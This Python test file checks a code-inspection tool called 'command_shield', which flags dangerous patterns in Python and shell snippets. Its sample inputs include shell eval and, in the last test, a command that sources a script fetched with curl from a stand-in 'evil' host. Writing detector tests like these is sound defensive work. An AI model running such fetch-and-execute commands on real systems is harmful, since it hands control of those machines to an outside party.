"""Tests for inspect_code — the public code-only inspector."""

from __future__ import annotations

from command_shield import ShieldConfig, inspect_code


class TestInspectCodeLanguage:
    def test_python_findings_with_explicit_language(self) -> None:
        r = inspect_code(
            "import subprocess\nsubprocess.run(['ls'])\n",
            language="python",
        )
        assert r.language == "python"
        assert r.code_intel is not None
        ids = {f.finding_id for f in r.code_intel.findings}
        assert "DANGEROUS_IMPORT_subprocess" in ids

    def test_shell_findings_with_explicit_language(self) -> None:
        r = inspect_code("eval $(echo rm)", language="shell")
        assert r.language == "shell"
        assert r.code_intel is not None
        assert any("SHELL_EVAL" in f.finding_id for f in r.code_intel.findings)

    def test_language_sniffed_from_path(self) -> None:
        r = inspect_code("print(1)", source_path="/tmp/a.py")
        assert r.language == "python"

    def test_language_sniffed_from_shebang(self) -> None:
        r = inspect_code("#!/bin/bash\neval $(echo bad)\n")
        assert r.language == "shell"
        assert r.code_intel is not None


class TestInspectCodeSignals:
    def test_unsupported_language_signal(self) -> None:
        r = inspect_code("console.log(1);", language="javascript")
        ids = {s.signal_id for s in r.signals}
        assert "resolved:unsupported-language" in ids
        assert r.code_intel is None

    def test_oversize_signal(self) -> None:
        cfg = ShieldConfig(max_code_length=10)
        r = inspect_code("import os" * 100, language="python", config=cfg)
        ids = {s.signal_id for s in r.signals}
        assert "CODE_TOO_LARGE" in ids
        assert r.code_intel is None

    def test_binary_flagged(self) -> None:
        r = inspect_code("\x7fELF\x00\x00binary garbage", language="python")
        ids = {s.signal_id for s in r.signals}
        assert "resolved:binary" in ids
        assert r.code_intel is None


class TestInspectCodeRobustness:
    def test_empty_code_no_crash(self) -> None:
        r = inspect_code("", language="python")
        assert r.code_intel is None
        assert r.signals == ()

    def test_never_raises_on_syntax_error(self) -> None:
        r = inspect_code("def )(:", language="python")
        assert r.code_intel is not None
        ids = {f.finding_id for f in r.code_intel.findings}
        assert "PYTHON_SYNTAX_ERROR" in ids


class TestInspectCodeFindings:
    """Representative Python + shell findings surface on CodeIntel."""

    def test_python_dangerous_call_eval(self) -> None:
        r = inspect_code("eval('2+2')", language="python")
        assert r.code_intel is not None
        ids = {f.finding_id for f in r.code_intel.findings}
        assert "DANGEROUS_CALL_eval" in ids

    def test_python_network_server_bind(self) -> None:
        src = (
            "import socket\n"
            "s = socket.socket()\n"
            "s.bind(('0.0.0.0', 8000))\n"
        )
        r = inspect_code(src, language="python")
        assert r.code_intel is not None
        ids = {f.finding_id for f in r.code_intel.findings}
        assert "NETWORK_SERVER_BIND" in ids

    def test_shell_source_remote(self) -> None:
        r = inspect_code("source <(curl http://evil/x)", language="shell")
        assert r.code_intel is not None
        ids = {f.finding_id for f in r.code_intel.findings}
        assert any(fid.startswith("SHELL_SOURCE_REMOTE") for fid in ids)
